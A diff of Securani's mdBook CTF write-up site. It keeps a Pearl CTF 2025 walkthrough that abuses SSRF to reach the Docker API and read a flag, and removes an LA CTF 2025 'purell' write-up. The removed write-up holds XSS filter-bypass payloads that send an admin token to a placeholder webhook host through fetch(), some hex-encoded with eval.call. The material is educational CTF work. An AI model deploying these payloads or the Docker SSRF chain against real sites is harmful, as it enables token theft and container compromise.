@@ -3,8 +3,7 @@
     <head>
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
-        <title>Securani</title>
-        <meta name="robots" content="noindex">
+        <title>web/TIC-TAC-TOE - Securani</title>
 
 
         <!-- Custom HTML head -->
@@ -13,21 +12,21 @@
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="theme-color" content="#ffffff">
 
-        <link rel="icon" href="favicon.svg">
-        <link rel="shortcut icon" href="favicon.png">
-        <link rel="stylesheet" href="css/variables.css">
-        <link rel="stylesheet" href="css/general.css">
-        <link rel="stylesheet" href="css/chrome.css">
-        <link rel="stylesheet" href="css/print.css" media="print">
+        <link rel="icon" href="../favicon.svg">
+        <link rel="shortcut icon" href="../favicon.png">
+        <link rel="stylesheet" href="../css/variables.css">
+        <link rel="stylesheet" href="../css/general.css">
+        <link rel="stylesheet" href="../css/chrome.css">
+        <link rel="stylesheet" href="../css/print.css" media="print">
 
         <!-- Fonts -->
-        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
-        <link rel="stylesheet" href="fonts/fonts.css">
+        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../fonts/fonts.css">
 
         <!-- Highlight.js Stylesheets -->
-        <link rel="stylesheet" href="highlight.css">
-        <link rel="stylesheet" href="tomorrow-night.css">
-        <link rel="stylesheet" href="ayu-highlight.css">
+        <link rel="stylesheet" href="../highlight.css">
+        <link rel="stylesheet" href="../tomorrow-night.css">
+        <link rel="stylesheet" href="../ayu-highlight.css">
 
         <!-- Custom theme stylesheets -->
 
@@ -36,7 +35,7 @@
     <div id="body-container">
         <!-- Provide site root to javascript -->
         <script>
-            var path_to_root = "";
+            var path_to_root = "../";
             var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
         </script>
 
@@ -89,7 +88,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded affix "><a href="intro.html">Securani's CTF writeups</a></li><li class="chapter-item expanded affix "><li class="spacer"></li><li class="chapter-item expanded "><div><strong aria-hidden="true">1.</strong> Pearl CTF 2025</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="Pearl_CTF_2025/tictactoe.html"><strong aria-hidden="true">1.1.</strong> web/TIC-TAC-TOE</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> LA CTF 2025</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="LA_CTF_2025/purell.html"><strong aria-hidden="true">2.1.</strong> web/purell</a></li></ol></li><li class="chapter-item expanded "><li class="spacer"></li></ol>
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../intro.html">Securani's CTF writeups</a></li><li class="chapter-item expanded affix "><li class="spacer"></li><li class="chapter-item expanded "><div><strong aria-hidden="true">1.</strong> Pearl CTF 2025</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../Pearl_CTF_2025/tictactoe.html" class="active"><strong aria-hidden="true">1.1.</strong> web/TIC-TAC-TOE</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> LA CTF 2025</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../LA_CTF_2025/purell.html"><strong aria-hidden="true">2.1.</strong> web/purell</a></li></ol></li><li class="chapter-item expanded "><li class="spacer"></li></ol>
             </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                 <div class="sidebar-resize-indicator"></div>
@@ -142,7 +141,7 @@
                     <h1 class="menu-title"><a style="text-decoration:none;" href="/">Securani</a></h1>
 
                     <div class="right-buttons">
-                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                             <i id="print-button" class="fa fa-print"></i>
                         </a>
 
@@ -161,15 +160,10 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="securanis-ctf-writeups"><a class="header" href="#securanis-ctf-writeups">Securani's CTF writeups</a></h1>
-<p>Hello everyone! Here, we will post detailed write-ups and solutions for the CTF challenges we tackle. These write-ups will provide insights into our problem-solving approaches, the techniques we used, and the lessons learned along the way. Whether you're a seasoned participant or new to CTFs, we hope these resources will help you enhance your skills and understand the challenges better.</p>
-<p>We invite you to join us on this journey. Stay tuned for updates, tips, and highlights from our competitions. </p>
-<p>Here you can find latest information: <a href="https://www.linkedin.com/company/securani">Linkedin</a></p>
-<p>Together, let’s push our limits and achieve great things!</p>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="webtic-tac-toe---pearl-ctf-2025"><a class="header" href="#webtic-tac-toe---pearl-ctf-2025">web/Tic-Tac-Toe - Pearl CTF 2025</a></h1>
+                        <h1 id="webtic-tac-toe---pearl-ctf-2025"><a class="header" href="#webtic-tac-toe---pearl-ctf-2025">web/Tic-Tac-Toe - Pearl CTF 2025</a></h1>
 <h4 id="category-web"><a class="header" href="#category-web"><strong>Category:</strong> Web</a></h4>
 <p><strong>Description</strong>: This challenge involves interacting with a Tic-Tac-Toe game server through a Flask web application. The application acts as a proxy, forwarding requests to a Dockerized game API. The goal is to exploit vulnerabilities in the proxy and/or the Docker setup to read the flag located at <code>/flag/flag.txt</code> within the main container.</p>
-<p><img src="Pearl_CTF_2025/imgs/tic-tac-toe/img1.png" alt="Image1" /></p>
+<p><img src="imgs/tic-tac-toe/img1.png" alt="Image1" /></p>
 <h2 id="understanding-the-code-and-application-flow"><a class="header" href="#understanding-the-code-and-application-flow">Understanding the Code and Application Flow</a></h2>
 <p>The challenge consists of three main files: <code>app.py</code>, <code>url.py</code>, and <code>Dockerfile</code>. Let's break down how the application works:</p>
 <p><strong>1. <code>app.py</code> (The Flask Application):</strong></p>
@@ -364,155 +358,28 @@ CMD [&quot;gunicorn&quot;, &quot;--bind&quot;, &quot;0.0.0.0:80&quot;, &quot;app
 <p><strong>Step 1: SSRF Reconnaissance with <code>/containers/json</code></strong></p>
 <p>This step is crucial for confirming our ability to reach the Docker API through the SSRF.</p>
 <p><strong>Example of Request and Response sent when clicking &quot;Ping!&quot; button on website:</strong>
-<img src="Pearl_CTF_2025/imgs/tic-tac-toe/img2.png" alt="Image2" />
-<img src="Pearl_CTF_2025/imgs/tic-tac-toe/img2_2.png" alt="Image2_2" /></p>
+<img src="imgs/tic-tac-toe/img2.png" alt="Image2" />
+<img src="imgs/tic-tac-toe/img2_2.png" alt="Image2_2" /></p>
 <p><strong>Testing SSRF vulnerability</strong>
-<img src="Pearl_CTF_2025/imgs/tic-tac-toe/img3.png" alt="Image3" /></p>
+<img src="imgs/tic-tac-toe/img3.png" alt="Image3" /></p>
 <ul>
 <li><strong><code>&quot;localhost:8000/&lt;game_action&gt;&quot;: &quot;127.0.0.1:2375/containers/json&quot;</code>:</strong> This is where we exploit the SSRF. The key is replaced with Docker API endpoint.</li>
 </ul>
-<p><img src="Pearl_CTF_2025/imgs/tic-tac-toe/img3_2.png" alt="Image3_2" /></p>
+<p><img src="imgs/tic-tac-toe/img3_2.png" alt="Image3_2" /></p>
 <p>If the response contains a JSON array describing running Docker containers, we have successfully confirmed the SSRF.</p>
 <p><strong>Step 2: Create a Container to Mount the Flag</strong></p>
 <p><strong>Request and Response:</strong>
-<img src="Pearl_CTF_2025/imgs/tic-tac-toe/img4.png" alt="Image4" />
-<img src="Pearl_CTF_2025/imgs/tic-tac-toe/img4_2.png" alt="Image4_2" /></p>
+<img src="imgs/tic-tac-toe/img4.png" alt="Image4" />
+<img src="imgs/tic-tac-toe/img4_2.png" alt="Image4_2" /></p>
 <p><strong>Step 3: Retrieve the Flag</strong>
 We use <code>/containers/{id}/archive</code> and send id of our container (we get it in the previous step).</p>
 <p><strong>Request and Response:</strong>
-<img src="Pearl_CTF_2025/imgs/tic-tac-toe/img5.png" alt="Image5" />
-<img src="Pearl_CTF_2025/imgs/tic-tac-toe/img5_2.png" alt="Image5_2" /></p>
+<img src="imgs/tic-tac-toe/img5.png" alt="Image5" />
+<img src="imgs/tic-tac-toe/img5_2.png" alt="Image5_2" /></p>
 <p>The response contains the flag.</p>
 <pre><code>pearl{do_y0u_r34llY_kn0w_d0ck3r_w3ll?}
 </code></pre>
 <h2 id="conclusion"><a class="header" href="#conclusion">Conclusion</a></h2>
-<p>If you enjoyed this write-up and found it useful, feel free to <strong>add me on <a href="https://linkedin.com/in/morzelowski">LinkedIn</a></strong> for more CTF challenges, security research, and infosec content!</p>
-<p>Also, be sure to check out <strong><a href="https://www.linkedin.com/company/securani/">Securani Linkedin</a></strong> for more cybersecurity insights, challenges, and learning resources. 🚀🔒</p>
-<p>Stay curious and keep hacking! 😈🔥</p>
-<p>M0U</p>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="webpurell---la-ctf-2025"><a class="header" href="#webpurell---la-ctf-2025">web/purell - LA CTF 2025</a></h1>
-<h4 id="category-web-1"><a class="header" href="#category-web-1"><strong>Category:</strong> Web</a></h4>
-<p><strong>Description</strong>: Here in purellland, we sanitize your inputs. We kill 99% of germs, can you be the 1% germ that slips through?</p>
-<p>This multi-level CTF challenge uses Node.js and Express. Each level has a custom HTML sanitizer to block XSS, and the goal is to bypass these filters to retrieve tokens from the admin. Then, you use these tokens to get flag parts.</p>
-<p><img src="LA_CTF_2025/imgs/purell/img1.png" alt="Image1" /></p>
-<h2 id="understanding-the-code"><a class="header" href="#understanding-the-code">Understanding the Code</a></h2>
-<p>The challenge provides a Node.js application using Express. Below are the key components of the challenge:</p>
-<ul>
-<li><strong>Cookie-based Admin Authentication</strong>
-<ul>
-<li>Users can attempt to inject HTML/JS into the <code>html</code> GET parameter.</li>
-<li>Admin bot visits the provided URL.</li>
-</ul>
-</li>
-</ul>
-<p>The challenge employs a series of progressively stricter sanitization measures on the <code>html</code> parameter:</p>
-<ul>
-<li>
-<p><strong>Level Zero:</strong> No sanitization is applied.</p>
-</li>
-<li>
-<p><strong>Level One:</strong> Input is blocked if it contains the substring <code>script</code>.</p>
-</li>
-<li>
-<p><strong>Level Two:</strong> Input is blocked if it contains either <code>script</code> or <code>on</code>.</p>
-</li>
-<li>
-<p><strong>Level Three:</strong> The input is converted to lowercase, and all occurrences of <code>script</code> and <code>on</code> are removed.</p>
-</li>
-<li>
-<p><strong>Level Four:</strong> In addition to Level Three modifications, all <code>&gt;</code> characters are removed.</p>
-</li>
-<li>
-<p><strong>Level Five:</strong> All whitespace characters are removed, along with the previous filters.</p>
-</li>
-<li>
-<p><strong>Level Six:</strong> Builds upon all previous modifications and further removes parentheses <code>()</code> and square brackets <code>[]</code>.</p>
-</li>
-<li>
-<p><strong>Flag Submission Flow</strong></p>
-<ul>
-<li>Users receive test tokens (<code>purell-token{xss_guru_&lt;level&gt;}</code>) if they are not the admin bot.</li>
-<li>The real flag parts are only provided to the admin bot.</li>
-<li>The flag is reconstructed from different levels.</li>
-</ul>
-</li>
-</ul>
-<h2 id="exploitation-1"><a class="header" href="#exploitation-1">Exploitation</a></h2>
-<h4 id="level-0---a-friendly-warmup"><a class="header" href="#level-0---a-friendly-warmup">Level 0 - A Friendly Warmup</a></h4>
-<p>As the title implies, this introductory level is designed to help you craft a payload that will later be modified in subsequent levels. The objective here is to steal the token, which can be achieved using tools such as Burp Suite Collaborator or a Webhook Site.</p>
-<p>In my approach, I utilized the JavaScript <code>fetch</code> function to send a GET request with the token appended to the URL. Since the token is embedded within a <code>&lt;span&gt;</code> element with the class name <code>flag</code>, I used <code>querySelector</code> to extract only the required token.</p>
-<p><strong>Payload:</strong></p>
-<pre><code class="language-html">&lt;script&gt;
-fetch('https://your-colab-or-webhook/?flag='+document['querySelector']('.flag')['innerHTML'])
-&lt;/script&gt;
-</code></pre>
-<p>After pasting the payload and clicking the <code>Render</code> button, the page reloaded, and the URL was automatically generated—ready to be copied and submitted to the admin bot.
-<img src="LA_CTF_2025/imgs/purell/img2.png" alt="Image1" /></p>
-<p>After submitting the URL to the admin bot, we will receive a request in my collaborator that looked similar to the following:
-<img src="LA_CTF_2025/imgs/purell/img3.png" alt="Image1" />
-To solve <strong>Level 0</strong>, we can simply took the stolen admin token from my collaborator, paste it into the appropriate input field, and submit it. This grants access to website with part of flag.
-<img src="LA_CTF_2025/imgs/purell/img4.png" alt="Image1" /></p>
-<h4 id="level-1---no-scripts-allowed-fr-fr"><a class="header" href="#level-1---no-scripts-allowed-fr-fr">Level 1 - no scripts allowed fr fr</a></h4>
-<p>In this level, the string <code>script</code> is blocked, preventing the use of standard <code>&lt;script&gt;</code> tags. To bypass this restriction, We can modify the payload to use an <code>&lt;img&gt;</code> tag with an <code>onerror</code> event, which executes JavaScript when the image fails to load.</p>
-<p><strong>Payload:</strong></p>
-<pre><code class="language-html">&lt;img src=x onerror=&quot;fetch('https://your-colab-or-webhook/?flag='+document['querySelector']('.flag')['innerHTML'])&quot;&gt;
-</code></pre>
-<p>Flag part: <code>b3s7_x40ss_</code></p>
-<h4 id="level-2---no-more-xss-please"><a class="header" href="#level-2---no-more-xss-please">Level 2 - NO MORE XSS PLEASE</a></h4>
-<p>In this level, both the strings <code>script</code> and <code>on</code> are blocked, preventing the use of the previous solution. However, when examining the sanitization logic, we notice that it only checks for the lowercase <code>on</code>. This means we can bypass the restriction by using an uppercase variation of <code>onerror</code>, such as <code>ONERROR</code>.</p>
-<p><strong>Payload:</strong></p>
-<pre><code class="language-html">&lt;img src=x ONERROR=&quot;fetch('https://your-colab-or-webhook/?flag='+document['querySelector']('.flag')['innerHTML'])&quot;&gt;
-</code></pre>
-<p>Flag part: <code>h4nd_g34m_</code></p>
-<h4 id="level-3---ok-now-yall-are-cooked-no-more-scripts-or-on"><a class="header" href="#level-3---ok-now-yall-are-cooked-no-more-scripts-or-on">Level 3 - ok now yall are cooked, no more scripts or on</a></h4>
-<p>In this level, the website processes our input by first converting it to lowercase and then <strong>removing</strong> (not blocking) occurrences of the strings <code>on</code> and <code>script</code>. This means we can't rely on simple case manipulation. However, the sanitization is <strong>not applied recursively</strong>, meaning it only removes <strong>single occurrences</strong> of <code>on</code> and <code>script</code> per pass without continuously rechecking the modified string.</p>
-<p><strong>Additional Challenge</strong>
-A major issue arises with our JavaScript code: <strong><code>querySelector</code> gets converted to <code>queryselector</code></strong>, breaking our ability to extract the flag. To bypass this, we need a way to preserve uppercase letters.</p>
-<p><strong>Bypass Strategy</strong>
-To maintain uppercase letters, we can use JavaScript <strong>template literals (<code>``</code>) instead of single (<code>'</code>) or double (<code>&quot;</code>) quotes</strong>. This allows us to encode function name and restore uppercase characters.</p>
-<p><strong>Payload:</strong></p>
-<pre><code class="language-html">&lt;img src=x oonnerror=&quot;token=document[`\x71\x75\x65\x72\x79\x53\x65\x6c\x65\x63\x74\x6f\x72`]('.flag')['\x69\x6e\x6e\x65\x72\x48\x54\x4d\x4c'];fetch('https://your-colab-or-webhook/?flag='+token)&quot;&gt;
-</code></pre>
-<p>Flag part: <code>4cr0ss_411_t1m3</code></p>
-<h4 id="level-4---screw-it-no-more-html-for-yall"><a class="header" href="#level-4---screw-it-no-more-html-for-yall">Level 4 - screw it no more html for yall</a></h4>
-<p>In this level, the website applies the same sanitization as before, but now it <strong>also removes the <code>&gt;</code> character</strong> from our input. This means we can no longer properly close tags in the traditional way.</p>
-<p><strong>Bypass Strategy</strong>
-Luckily, this is <strong>not a problem</strong> for us. Since browsers can automatically infer missing closing tags, we can simply <strong>omit the last <code>&gt;</code></strong> and append a new <code>&lt;img&gt;</code> tag at the end to fix any potential rendering issues.</p>
-<p><strong>Payload:</strong></p>
-<pre><code class="language-html">&lt;img src=x oonnerror=&quot;token=document[`\x71\x75\x65\x72\x79\x53\x65\x6c\x65\x63\x74\x6f\x72`]('.flag')['\x69\x6e\x6e\x65\x72\x48\x54\x4d\x4c'];fetch('https://your-colab-or-webhook/?flag='+token)&quot;&lt;img&gt;
-</code></pre>
-<p>Flag part: <code>_4nd_z_</code></p>
-<h4 id="level-5---no-whitespace-no-nothing"><a class="header" href="#level-5---no-whitespace-no-nothing">Level 5 - no whitespace, no nothing</a></h4>
-<p>In this level, the website now <strong>removes all whitespace characters</strong> in addition to the previous sanitization rules. This means we can’t rely on spaces to separate attributes or JavaScript code, making it more challenging to construct a valid payload.</p>
-<p><strong>Bypass Strategy</strong>
-Even though whitespace is removed, we can replace spaces with various separators such as <code>/</code>, <code>;</code>.
-Moreover, I added <code>&quot;</code> around <code>x</code> so payload is properly rendered.</p>
-<p><strong>Payload:</strong></p>
-<pre><code class="language-html">&lt;img/src=&quot;x&quot;/oonnerror=&quot;token=document[`\x71\x75\x65\x72\x79\x53\x65\x6c\x65\x63\x74\x6f\x72`]('.flag')['\x69\x6e\x6e\x65\x72\x48\x54\x4d\x4c'];fetch('https://your-colab-or-webhook/?flag='+token)&quot;&lt;img&gt;
-</code></pre>
-<p>Flag part: <code>un1v3rs3</code></p>
-<h4 id="level-6---no-parenthesis-megamind"><a class="header" href="#level-6---no-parenthesis-megamind">Level 6 - no parenthesis :megamind:</a></h4>
-<p>In this level, the website <strong>removes all parentheses <code>()</code> and <code>[]</code></strong> in addition to the previous restrictions (removal of <code>on</code>, <code>script</code>, <code>&gt;</code>, and whitespace). This prevents us from calling functions in the usual way, making it difficult to execute JavaScript.</p>
-<p><strong>Bypass Strategy</strong>
-Since <strong>parentheses are required for function calls</strong>, we need an alternative way to execute JavaScript. One approach is to use <strong><code>eval.call</code></strong>.</p>
-<p>This allowes us to either encode payload and do not use parenthesis.</p>
-<p><strong>Payload:</strong></p>
-<pre><code class="language-html">&lt;img/src=&quot;x&quot;/oonnerror=&quot;eval.call`${'\x74\x6f\x6b\x65\x6e\x3d\x64\x6f\x63\x75\x6d\x65\x6e\x74\x5b\x60\x71\x75\x65\x72\x79\x53\x65\x6c\x65\x63\x74\x6f\x72\x60\x5d\x28\x27\x2e\x66\x6c\x61\x67\x27\x29\x5b\x27\x69\x6e\x6e\x65\x72\x48\x54\x4d\x4c\x27\x5d\x3b\x66\x65\x74\x63\x68\x28\x27\x68\x74\x74\x70\x73\x3a\x2f\x2f\x79\x6f\x75\x72\x2d\x63\x6f\x6c\x61\x62\x2d\x6f\x72\x2d\x77\x65\x62\x68\x6f\x6f\x6b\x2f\x3f\x66\x6c\x61\x67\x3d\x27\x2b\x74\x6f\x6b\x65\x6e\x29'}`&quot;&lt;img&gt;
-</code></pre>
-<p>Encoded string is equal to:</p>
-<pre><code>token=document[`querySelector`]('.flag')['innerHTML'];fetch('https://your-colab-or-webhook/?flag='+token)
-</code></pre>
-<p>Flag part: <code>_1nf3c71ng_3v34y_1}</code></p>
-<p>Now that we have successfully exploited all levels, we can <strong>combine parts</strong> to reconstruct the complete flag:
-<code>lactf{1_4m_z3_b3s7_x40ss_h4nd_g34m_4cr0ss_411_t1m3_4nd_z_un1v3rs3_1nf3c71ng_3v34y_1}</code></p>
-<h4 id="you-can-also-try-payloads-yourself"><a class="header" href="#you-can-also-try-payloads-yourself">You can also try payloads yourself!</a></h4>
-<p>Download source code: <a href="https://securani.com/files/purell-dist.zip">Download</a>
-Then unzip and in the folder run: </p>
-<ol>
-<li><code>npm install .</code></li>
-<li><code>node app_distribution.js</code></li>
-<li>Now website available under: <code>http://localhost:3000/</code></li>
-</ol>
 <p>If you enjoyed this write-up and found it useful, feel free to <strong>add me on <a href="https://linkedin.com/in/morzelowski">LinkedIn</a></strong> for more CTF challenges, security research, and infosec content!</p>
 <p>Also, be sure to check out <strong><a href="https://www.linkedin.com/company/securani/">Securani Linkedin</a></strong> for more cybersecurity insights, challenges, and learning resources. 🚀🔒</p>
 <p>Stay curious and keep hacking! 😈🔥</p>
@@ -522,7 +389,13 @@ Then unzip and in the folder run: </p>
 
                     <nav class="nav-wrapper" aria-label="Page navigation">
                         <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../intro.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
 
+                            <a rel="next prefetch" href="../LA_CTF_2025/purell.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
 
                         <div style="clear: both"></div>
                     </nav>
@@ -530,7 +403,13 @@ Then unzip and in the folder run: </p>
             </div>
 
             <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../intro.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
 
+                    <a rel="next prefetch" href="../LA_CTF_2025/purell.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
             </nav>
 
         </div>
@@ -544,17 +423,12 @@ Then unzip and in the folder run: </p>
 
 
 
-        <script src="clipboard.min.js"></script>
-        <script src="highlight.js"></script>
-        <script src="book.js"></script>
+        <script src="../clipboard.min.js"></script>
+        <script src="../highlight.js"></script>
+        <script src="../book.js"></script>
 
         <!-- Custom JS scripts -->
 
-        <script>
-        window.addEventListener('load', function() {
-            window.setTimeout(window.print, 100);
-        });
-        </script>
 
     </div>
     </body>
